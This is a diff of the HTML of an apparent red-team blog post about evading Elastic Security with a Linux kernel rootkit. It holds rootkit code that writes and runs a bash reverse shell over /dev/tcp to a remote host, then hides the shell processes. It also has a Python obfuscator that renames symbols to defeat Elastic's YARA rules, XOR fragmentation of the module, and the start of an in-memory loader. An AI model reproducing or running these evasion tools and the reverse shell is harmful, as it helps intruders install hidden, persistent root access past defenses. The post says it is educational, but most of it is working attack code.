\"/singularity\" // Hide kworker immediately add_hidden_pid(current-\u003epid); // Create script with automatic process hiding snprintf(script, sizeof(script), \"#!/bin/bash\\n\" \"exec 196\u003c\u003e/dev/tcp/%s/%s\\n\" \"sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 \u0026\\n\" \"SHELL_PID=$!\\n\" \"sleep 1\\n\" \"kill -59 $SHELL_PID\\n\" \"kill -59 $$\\n\", YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026pos); 2. Execute with clean command line:\nchar *argv[] = {\"/bin/bash\", SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u003epid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u003c\u003e/dev/tcp/192.168.200.164/8081 sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 \u0026 SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic’s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit’s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security’s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you’ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n",
+  "wordCount" : "4134",
+  "inLanguage": "en",
+  "datePublished": "2025-10-30T14:15:09-04:00",
+  "dateModified": "2025-10-30T14:15:09-04:00",
+  "author":{
+    "@type": "Person",
+    "name": "0xMatheuZ"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/bypassing-elastic/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xMatheuZ",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
-<body id="top"><header class="site-head">
-  <div class="wrap">
+
+<body class=" dark" id="top">
+
+<header class="header">
     <nav class="nav">
-      <span class="prompt"><a href="/">matheuz</a>@0xm:~$</span>
-      <a href="/">Home</a>
-      <a href="/hacking">hacking</a>
-      <a href="/tags">Tags</a>
-      <a href="/search">Search</a>
+        <div class="logo">
+            <a href="/" accesskey="h" title="MatheuZ (Alt + H)">
+                <img src="/img/0xm-badge.png" alt="" aria-label="logo" height="28">MatheuZ</a>
+            <div class="logo-switches">
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="/hacking" title="hacking">
+                    <span>hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
     </nav>
-  </div>
 </header>
 <main class="main">
 
-<article class="article">
-  <div class="art-head">
-    <div class="crumbs">
-    <span class="prompt">$ cd</span>
-    <a href="/">~</a><span class="sep">/</span><a href="http://localhost:1313/hacking/">Hacking</a></div>
-
-    <h1 class="art-title">Evading Elastic Security: Linux Rootkit Detection Bypass</h1><p class="art-desc">Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging</p>
-    <div class="art-meta">
-      <span>October 30, 2025</span><span class="sep">·</span><span>20 min read</span>
-      <span class="sep">·</span><span>0xMatheuZ</span><span class="sep">·</span><span>Red Team</span>
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/hacking/">Hacking</a></div>
+    <h1 class="post-title">Evading Elastic Security: Linux Rootkit Detection Bypass</h1><div class="post-description">Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging</div>
+    <div class="post-meta"><span title='2025-10-30 14:15:09 -0400 -0400'>October 30, 2025</span>&nbsp;·&nbsp;20 min&nbsp;·&nbsp;0xMatheuZ</div>
+    <div class="post-badges"><span>Red Team</span><span>#Evasion</span>
     </div>
-    <div class="art-tags"><a href="/tags/evasion/">Evasion</a>
-    </div>
-  </div>
-
-  <hr class="art-sep">
-
-  <div class="content">
-    <p><img src="https://giffiles.alphacoders.com/223/223415.gif" alt="imgur"></p>
+  </header>
+  <div class="post-content"><p><img loading="lazy" src="https://giffiles.alphacoders.com/223/223415.gif" alt="imgur"  />
+</p>
 <p>Stealthy Kernel Rootkit: <a href="https://github.com/MatheuZSecurity/Singularity">https://github.com/MatheuZSecurity/Singularity</a></p>
 <p>Rootkit Researchers: <a href="https://discord.gg/66N5ZQppU7">https://discord.gg/66N5ZQppU7</a></p>
-<h1 id="introduction">Introduction</h1>
+<h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
 <p>Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.</p>
 <p>This article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security&rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.</p>
-<h1 id="table-of-contents">Table of Contents</h1>
+<h1 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h1>
 <ul>
 <li><a href="#introduction">Introduction</a></li>
 <li><a href="#understanding-the-threat-landscape-elastic-yara-rules">Understanding the Threat Landscape: Elastic YARA Rules</a>
@@ -97,13 +191,15 @@
 <li><a href="#bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells</a></li>
 <li><a href="#conclusion">Conclusion</a></li>
 </ul>
-<h1 id="understanding-the-threat-landscape-elastic-yara-rules">Understanding the Threat Landscape: Elastic YARA Rules</h1>
-<p><img src="https://i.imgur.com/6dUtAak.png" alt="imgur"></p>
+<h1 id="understanding-the-threat-landscape-elastic-yara-rules">Understanding the Threat Landscape: Elastic YARA Rules<a hidden class="anchor" aria-hidden="true" href="#understanding-the-threat-landscape-elastic-yara-rules">#</a></h1>
+<p><img loading="lazy" src="https://i.imgur.com/6dUtAak.png" alt="imgur"  />
+</p>
 <p>In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.</p>
-<p><img src="https://i.imgur.com/guHHiEj.png" alt="imgur"></p>
+<p><img loading="lazy" src="https://i.imgur.com/guHHiEj.png" alt="imgur"  />
+</p>
 <p>There were approximately 26 detections.</p>
 <p>Upon investigation, I identified the specific Elastic YARA rules detecting our rootkit:</p>
-<h2 id="primary-detection-rules">Primary Detection Rules</h2>
+<h2 id="primary-detection-rules">Primary Detection Rules<a hidden class="anchor" aria-hidden="true" href="#primary-detection-rules">#</a></h2>
 <p><a href="https://raw.githubusercontent.com/elastic/protections-artifacts/refs/heads/main/yara/rules/Linux_Rootkit_BrokePKG.yar">Linux_Rootkit_BrokePKG.yar</a></p>
 <p><a href="https://raw.githubusercontent.com/elastic/protections-artifacts/ff154ddf0762a4a030c8832eee7753cb19b950ff/yara/rules/Linux_Rootkit_Generic.yar">Linux_Rootkit_Generic.yar</a></p>
 <pre tabindex="0"><code>Linux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names
@@ -112,27 +208,27 @@ Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations
 Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions
 Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms
 Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits
-</code></pre><h2 id="detection-signature-analysis">Detection Signature Analysis</h2>
-<h3 id="generic-rootkit-detection-61229bdf">Generic Rootkit Detection (61229bdf)</h3>
+</code></pre><h2 id="detection-signature-analysis">Detection Signature Analysis<a hidden class="anchor" aria-hidden="true" href="#detection-signature-analysis">#</a></h2>
+<h3 id="generic-rootkit-detection-61229bdf">Generic Rootkit Detection (61229bdf)<a hidden class="anchor" aria-hidden="true" href="#generic-rootkit-detection-61229bdf">#</a></h3>
 <pre tabindex="0"><code>Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc.
 Condition: 4 or more matching strings
 Total patterns: 57 distinct function names
-</code></pre><h3 id="hook-pattern-detection-482bca48">Hook Pattern Detection (482bca48)</h3>
+</code></pre><h3 id="hook-pattern-detection-482bca48">Hook Pattern Detection (482bca48)<a hidden class="anchor" aria-hidden="true" href="#hook-pattern-detection-482bca48">#</a></h3>
 <pre tabindex="0"><code>System strings: sys_call_table, kallsyms_lookup_name, kprobe
 Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_
 Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show
 Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks)
-</code></pre><h3 id="license-string-detection-5d17781b">License String Detection (5d17781b)</h3>
+</code></pre><h3 id="license-string-detection-5d17781b">License String Detection (5d17781b)<a hidden class="anchor" aria-hidden="true" href="#license-string-detection-5d17781b">#</a></h3>
 <pre tabindex="0"><code>Targets: kallsyms_lookup_name_t + &#34;license=GPL&#34;
 Condition: Both strings must be present
 Purpose: Detects ftrace-based rootkits using kallsyms
-</code></pre><h3 id="ftrace-helper-detection-f07bcabe">Ftrace Helper Detection (f07bcabe)</h3>
+</code></pre><h3 id="ftrace-helper-detection-f07bcabe">Ftrace Helper Detection (f07bcabe)<a hidden class="anchor" aria-hidden="true" href="#ftrace-helper-detection-f07bcabe">#</a></h3>
 <pre tabindex="0"><code>Targets:
   - fh_install_hook
   - fh_remove_hook
   - fh_resolve_hook_address
 Condition: 2 or more matching strings
-</code></pre><h3 id="brokepkg-specific-detection-7b7d4581">BrokePKG Specific Detection (7b7d4581)</h3>
+</code></pre><h3 id="brokepkg-specific-detection-7b7d4581">BrokePKG Specific Detection (7b7d4581)<a hidden class="anchor" aria-hidden="true" href="#brokepkg-specific-detection-7b7d4581">#</a></h3>
 <pre tabindex="0"><code>License strings:
   - author=R3tr074
   - name=brokepkg
@@ -153,10 +249,10 @@ Hook patterns:
 
 Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </code></pre><p>Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?</p>
-<h1 id="the-singularity-rootkit-capabilities-overview">The Singularity Rootkit: Capabilities Overview</h1>
+<h1 id="the-singularity-rootkit-capabilities-overview">The Singularity Rootkit: Capabilities Overview<a hidden class="anchor" aria-hidden="true" href="#the-singularity-rootkit-capabilities-overview">#</a></h1>
 <p>Source: <a href="https://github.com/MatheuZSecurity/Singularity">https://github.com/MatheuZSecurity/Singularity</a></p>
 <p>Before diving into evasion techniques, let&rsquo;s understand what the Singularity rootkit accomplishes:</p>
-<h2 id="core-features">Core Features</h2>
+<h2 id="core-features">Core Features<a hidden class="anchor" aria-hidden="true" href="#core-features">#</a></h2>
 <ul>
 <li><strong>Process Hiding:</strong> Hides processes from /proc.</li>
 <li><strong>File and Directory Hiding:</strong> Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.)</li>
@@ -174,8 +270,8 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li><strong>Log Sanitization:</strong> Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit</li>
 <li><strong>Module Stealth:</strong> Self-hiding from lsmod and /sys/module directory</li>
 </ul>
-<h1 id="evasion-technique-1-symbol-name-randomization">Evasion Technique 1: Symbol Name Randomization</h1>
-<h2 id="the-problem">The Problem</h2>
+<h1 id="evasion-technique-1-symbol-name-randomization">Evasion Technique 1: Symbol Name Randomization<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-1-symbol-name-randomization">#</a></h1>
+<h2 id="the-problem">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem">#</a></h2>
 <p>Rootkits typically use predictable naming patterns that become signatures:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hook_getdents64</span>
 </span></span><span class="line"><span class="cl"><span class="n">fake_tcp4_seq_show</span>
@@ -192,7 +288,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">hook1</span> <span class="o">=</span> <span class="s">&#34;_getdents&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">hook2</span> <span class="o">=</span> <span class="s">&#34;_kill&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">hook3</span> <span class="o">=</span> <span class="s">&#34;_tcp4_seq_show&#34;</span>
-</span></span></code></pre></div><h2 id="the-solution-intelligent-name-randomization">The Solution: Intelligent Name Randomization</h2>
+</span></span></code></pre></div><h2 id="the-solution-intelligent-name-randomization">The Solution: Intelligent Name Randomization<a hidden class="anchor" aria-hidden="true" href="#the-solution-intelligent-name-randomization">#</a></h2>
 <p>Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_generate_random_name</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Generates random name that avoids YARA patterns&#34;&#34;&#34;</span>
@@ -207,14 +303,14 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    <span class="n">middle</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">)))</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">middle</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">suffix</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><h3 id="key-features">Key Features</h3>
+</span></span></code></pre></div><h3 id="key-features">Key Features<a hidden class="anchor" aria-hidden="true" href="#key-features">#</a></h3>
 <ul>
 <li>No suspicious prefixes (hook_, fake_, hide_)</li>
 <li>Looks like legitimate kernel code</li>
 <li>Maintains internal consistency via mapping file</li>
 <li>Protects kernel API calls from renaming</li>
 </ul>
-<h3 id="protected-names">Protected Names</h3>
+<h3 id="protected-names">Protected Names<a hidden class="anchor" aria-hidden="true" href="#protected-names">#</a></h3>
 <p>The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_protected_names</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Set</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Names from kernel that should NOT be changed&#34;&#34;&#34;</span>
@@ -234,7 +330,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">        <span class="c1"># Entry points</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;main&#39;</span><span class="p">,</span> <span class="s1">&#39;init&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></div><h3 id="function-name-extraction">Function Name Extraction</h3>
+</span></span></code></pre></div><h3 id="function-name-extraction">Function Name Extraction<a hidden class="anchor" aria-hidden="true" href="#function-name-extraction">#</a></h3>
 <p>The obfuscator scans source files for function definitions using multiple regex patterns:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">function_patterns</span> <span class="o">=</span> <span class="p">[</span>
 </span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\bnotrace\s+(?:static\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\s+(\w+)\s*\(&#39;</span><span class="p">,</span>
@@ -246,7 +342,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\bHOOK\s*\([^,]+,\s*(\w+)\s*,&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\btypedef\s+[^;]+\s+(\w+_t)\s*;&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"><span class="p">]</span>
-</span></span></code></pre></div><h3 id="example-transformation">Example Transformation</h3>
+</span></span></code></pre></div><h3 id="example-transformation">Example Transformation<a hidden class="anchor" aria-hidden="true" href="#example-transformation">#</a></h3>
 <p><strong>Before:</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// modules/hiding_directory.c
 </span></span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">hook_getdents64</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
@@ -269,7 +365,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">res</span> <span class="o">=</span> <span class="nf">net_xzpnrm_func</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// ...
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h3 id="implementation-details">Implementation Details</h3>
+</span></span></code></pre></div><h3 id="implementation-details">Implementation Details<a hidden class="anchor" aria-hidden="true" href="#implementation-details">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_replace_in_content</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">mapping</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Replace names in content&#34;&#34;&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">modified</span> <span class="o">=</span> <span class="n">content</span>
@@ -284,8 +380,8 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">modified</span>
 </span></span></code></pre></div><p>The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.</p>
-<h1 id="evasion-technique-2-module-fragmentation">Evasion Technique 2: Module Fragmentation</h1>
-<h2 id="the-problem-1">The Problem</h2>
+<h1 id="evasion-technique-2-module-fragmentation">Evasion Technique 2: Module Fragmentation<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-2-module-fragmentation">#</a></h1>
+<h2 id="the-problem-1">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem-1">#</a></h2>
 <p>EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that&rsquo;s easy to analyze:</p>
 <ul>
 <li>Signature scanning of the entire module on disk</li>
@@ -293,9 +389,9 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li>Symbol table enumeration</li>
 <li>String pattern detection (including &ldquo;GPL&rdquo;, &ldquo;kallsyms_lookup_name&rdquo;, etc.)</li>
 </ul>
-<h2 id="the-solution-fragment--xor-encoding--ephemeral-in-memory-loading">The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading</h2>
+<h2 id="the-solution-fragment--xor-encoding--ephemeral-in-memory-loading">The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading<a hidden class="anchor" aria-hidden="true" href="#the-solution-fragment--xor-encoding--ephemeral-in-memory-loading">#</a></h2>
 <p>We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.</p>
-<h3 id="how-this-evades-detection">How This Evades Detection</h3>
+<h3 id="how-this-evades-detection">How This Evades Detection<a hidden class="anchor" aria-hidden="true" href="#how-this-evades-detection">#</a></h3>
 <p>The evasion works through a <strong>multi-layered approach</strong>:</p>
 <ol>
 <li><strong>Disk-Based YARA Evasion:</strong> XOR encoding breaks string signatures in stored fragments</li>
@@ -309,7 +405,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li>Immediate self-hiding after module load (invisible to subsequent analysis)</li>
 </ul>
 <p>&hellip;creates an effective evasion without requiring permanent string obfuscation in memory.</p>
-<h3 id="fragmentation-pipeline">Fragmentation Pipeline:</h3>
+<h3 id="fragmentation-pipeline">Fragmentation Pipeline:<a hidden class="anchor" aria-hidden="true" href="#fragmentation-pipeline">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fragment</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">chunk_size</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">65536</span><span class="p">,</span> <span class="n">encode</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
 </span></span></span><span class="line"><span class="cl"><span class="s2">    Fragment the .ko into chunks
@@ -366,7 +462,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">fragments</span>
-</span></span></code></pre></div><h3 id="xor-encoding">XOR Encoding</h3>
+</span></span></code></pre></div><h3 id="xor-encoding">XOR Encoding<a hidden class="anchor" aria-hidden="true" href="#xor-encoding">#</a></h3>
 <p>We use a simple but effective XOR cipher with a random 16-byte key:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_xor_encode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Simple XOR encoding for obfuscation&#34;&#34;&#34;</span>
@@ -384,7 +480,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li>Minimal overhead</li>
 <li>Easy to implement in C loader</li>
 </ul>
-<h3 id="evasion-layer-breakdown">Evasion Layer Breakdown</h3>
+<h3 id="evasion-layer-breakdown">Evasion Layer Breakdown<a hidden class="anchor" aria-hidden="true" href="#evasion-layer-breakdown">#</a></h3>
 <pre tabindex="0"><code>┌─────────────────────────────────────────────────────────────────┐
 │ LAYER 1: Fragments on Disk (XOR Encoded)                       │
 ├─────────────────────────────────────────────────────────────────┤
@@ -431,7 +527,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 │                                                                  │
 │ Result: Invisible to analysis tools                            │
 └─────────────────────────────────────────────────────────────────┘
-</code></pre><h3 id="why-elastic-doesnt-detect-this">Why Elastic Doesn&rsquo;t Detect This</h3>
+</code></pre><h3 id="why-elastic-doesnt-detect-this">Why Elastic Doesn&rsquo;t Detect This<a hidden class="anchor" aria-hidden="true" href="#why-elastic-doesnt-detect-this">#</a></h3>
 <ol>
 <li>
 <p><strong>YARA primarily scans disk files</strong></p>
@@ -458,7 +554,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </ul>
 </li>
 </ol>
-<h3 id="resulting-structure">Resulting Structure</h3>
+<h3 id="resulting-structure">Resulting Structure<a hidden class="anchor" aria-hidden="true" href="#resulting-structure">#</a></h3>
 <pre tabindex="0"><code>fragments/
 ├── chunk_000.bin    # XOR-encoded fragment (64KB)
 ├── chunk_001.bin    # XOR-encoded fragment (64KB)
@@ -467,7 +563,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 ├── chunk_N.bin      # Final fragment (variable size)
 ├── metadata.json    # Contains XOR key and checksums
 └── reconstruct.sh   # Automated reconstruction script
-</code></pre><h3 id="metadata-format">Metadata Format</h3>
+</code></pre><h3 id="metadata-format">Metadata Format<a hidden class="anchor" aria-hidden="true" href="#metadata-format">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nt">&#34;original_filename&#34;</span><span class="p">:</span> <span class="s2">&#34;singularity.ko&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">  <span class="nt">&#34;original_size&#34;</span><span class="p">:</span> <span class="mi">245632</span><span class="p">,</span>
@@ -482,7 +578,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9&#34;</span>
 </span></span><span class="line"><span class="cl">  <span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="custom-loader-via-memfd_create">Custom Loader via memfd_create</h2>
+</span></span></code></pre></div><h2 id="custom-loader-via-memfd_create">Custom Loader via memfd_create<a hidden class="anchor" aria-hidden="true" href="#custom-loader-via-memfd_create">#</a></h2>
 <p>Instead of using insmod or modprobe, we implement a custom loader that:</p>
 <ul>
 <li>Reads encrypted fragments from disk</li>
@@ -492,7 +588,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li>Loads the module via direct syscall</li>
 <li>Immediately closes the memfd (auto-deleted)</li>
 </ul>
-<h3 id="loader-architecture">Loader Architecture</h3>
+<h3 id="loader-architecture">Loader Architecture<a hidden class="anchor" aria-hidden="true" href="#loader-architecture">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
 </span></span></span><span class="line"><span class="cl"><span class="cm"> * Singularity Loader
